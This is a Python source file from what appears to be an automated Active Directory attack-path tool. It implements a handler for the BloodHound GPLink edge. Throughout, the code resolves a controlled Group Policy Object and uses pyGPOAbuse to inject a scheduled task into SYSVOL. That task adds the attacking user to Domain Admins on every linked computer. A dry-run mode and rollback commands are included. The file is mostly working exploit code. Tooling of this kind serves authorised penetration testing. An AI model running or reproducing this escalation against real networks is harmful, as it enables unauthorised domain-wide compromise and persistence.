"""GPO abuse handler for code execution on linked targets.

Exploits the ``GPLink`` (and ``GpLink``) BloodHound edge.  When a Group
Policy Object is linked to an Organizational Unit or domain, and the
attacker controls that GPO, a malicious scheduled task can be injected
into SYSVOL via **pyGPOAbuse** to execute commands on all computers
where the GPO applies.

Attack flow:
    1. Resolve the GPO Distinguished Name (via bloodyAD LDAP search).
    2. Extract the GPO GUID from the DN.
    3. Use pyGPOAbuse to create an immediate scheduled task that adds
       the attacking user to Domain Admins.
    4. Execution occurs at the next Group Policy refresh (~90 min)
       or can be forced via ``gpupdate /force``.

Rollback:
    Delete the ``ScheduledTasks.xml`` from SYSVOL and restore the
    original ``gpt.ini`` version.
"""

from __future__ import annotations

import shutil

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody
from pathstrike.tools import pygpoabuse_wrapper as pygpo


@register_handler("GPLink", "GpLink")
class GPLinkHandler(BaseEdgeHandler):
    """Exploit ``GPLink``/``GpLink`` edges via pyGPOAbuse.

    If we control a GPO that is linked to an OU or domain, pyGPOAbuse
    writes a malicious ``ScheduledTasks.xml`` into the GPO's SYSVOL
    share, updates ``gpt.ini``, and registers the required extension
    GUIDs — achieving code execution on all linked machines.
    """

    _gpo_dn: str | None = None
    _gpo_guid: str | None = None
    _taskname: str = "PathStrike"

    # ------------------------------------------------------------------
    # Prerequisites
    # ------------------------------------------------------------------

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if not shutil.which("pygpoabuse"):
            return (
                False,
                "pygpoabuse not found on PATH. "
                "Install via: pip install pygpoabuse",
            )

        if not shutil.which("bloodyAD"):
            self.logger.warning(
                "bloodyAD not found — GPO DN resolution may fail if "
                "DN is not available in edge properties."
            )

        gpo_name = self._get_gpo_name(edge)
        if not gpo_name:
            return (
                False,
                "Cannot determine GPO identity from edge properties.",
            )

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (
                    False,
                    f"No credentials available for '{source_user}'.",
                )

        return (
            True,
            f"Ready: pyGPOAbuse will inject scheduled task into GPO "
            f"'{gpo_name}' linked to {edge.target.name}.",
        )

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    async def exploit(
        self,
        edge: EdgeInfo,
        dry_run: bool = False,
    ) -> tuple[bool, str, list[Credential]]:
        source_user = self._resolve_principal(edge)
        gpo_name = self._get_gpo_name(edge)

        # --- Resolve GPO DN ------------------------------------------------
        gpo_dn = self._get_gpo_dn_from_props(edge)
        if not gpo_dn:
            auth_args = self._get_auth_args(source_user)
            gpo_dn = await bloody.resolve_dn(
                self.config, auth_args, f"(displayName={gpo_name})"
            )
            if not gpo_dn:
                return (
                    False,
                    f"Could not resolve DN for GPO '{gpo_name}' via LDAP",
                    [],
                )

        self._gpo_dn = gpo_dn

        # --- Extract GUID --------------------------------------------------
        gpo_guid = pygpo.extract_gpo_guid(gpo_dn)
        if not gpo_guid:
            return (
                False,
                f"Could not extract GUID from GPO DN: {gpo_dn}",
                [],
            )
        self._gpo_guid = gpo_guid

        # --- Build the DA escalation command --------------------------------
        command = (
            f"net group \"Domain Admins\" {source_user} /add /domain"
        )

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would use pyGPOAbuse to inject scheduled task "
                f"'{self._taskname}' into GPO '{gpo_name}' ({gpo_guid}). "
                f"Command: {command}",
                [],
            )

        # --- Get impacket-style auth ----------------------------------------
        target_string, auth_flags = self._get_impacket_auth(source_user)

        # --- Execute pyGPOAbuse ---------------------------------------------
        self.logger.info(
            "Using pyGPOAbuse to inject scheduled task into GPO '%s' (%s)",
            gpo_name,
            gpo_guid,
        )
        self.logger.info("Task command: %s", command)

        result = await pygpo.abuse_gpo(
            target_string=target_string,
            auth_flags=auth_flags,
            gpo_id=gpo_guid,
            dc_ip=self._get_dc_host(),
            command=command,
            taskname=self._taskname,
            force=True,
        )

        if not result["success"]:
            return (
                False,
                f"pyGPOAbuse failed for GPO '{gpo_name}': "
                f"{result.get('error', 'unknown')}",
                [],
            )

        self.logger.info(
            "Scheduled task injected into GPO '%s'. "
            "Command will execute on linked computers at next GP refresh.",
            gpo_name,
        )

        return (
            True,
            f"pyGPOAbuse injected scheduled task '{self._taskname}' into "
            f"GPO '{gpo_name}' ({gpo_guid}). "
            f"Command: {command}. "
            "Execution occurs at next Group Policy refresh (~90 min) "
            "or via 'gpupdate /force' on target machines.",
            [],
        )

    # ------------------------------------------------------------------
    # Rollback
    # ------------------------------------------------------------------

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        gpo_name = self._get_gpo_name(edge)
        gpo_guid = self._gpo_guid or ""
        domain = self._get_domain()

        sysvol_path = (
            f"\\\\{domain}\\SysVol\\{domain}\\Policies\\{gpo_guid}"
            f"\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
        )

        return RollbackAction(
            step_index=0,
            action_type="restore_gpo",
            description=(
                f"Remove scheduled task '{self._taskname}' from GPO "
                f"'{gpo_name}' and restore original GPO state"
            ),
            command=(
                f"# 1. Delete the injected ScheduledTasks.xml from SYSVOL:\n"
                f"smbclient.py '{domain}/{{}}'@{self._get_dc_host()} "
                f"-c 'del {sysvol_path}'\n"
                f"# 2. Restore gpt.ini version (decrement Machine version):\n"
                f"#    Edit {gpo_guid}\\Machine\\gpt.ini in SYSVOL\n"
                f"# 3. Reset gPCMachineExtensionNames via bloodyAD:\n"
                f"bloodyAD set object '{self._gpo_dn}' "
                f"gPCMachineExtensionNames -v ''"
            ),
            reversible=True,
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _get_gpo_name(self, edge: EdgeInfo) -> str:
        """Extract the GPO display name from edge/source properties."""
        props = dict(edge.properties)
        props.update(edge.source.properties)
        return (
            props.get("gpo_name")
            or props.get("displayname")
            or edge.source.name.split("@")[0]
        )

    def _get_gpo_dn_from_props(self, edge: EdgeInfo) -> str | None:
        """Try to get GPO DN directly from edge/source properties."""
        props = dict(edge.properties)
        props.update(edge.source.properties)
        return (
            props.get("gpo_dn")
            or props.get("distinguishedname")
            or props.get("dn")
        )
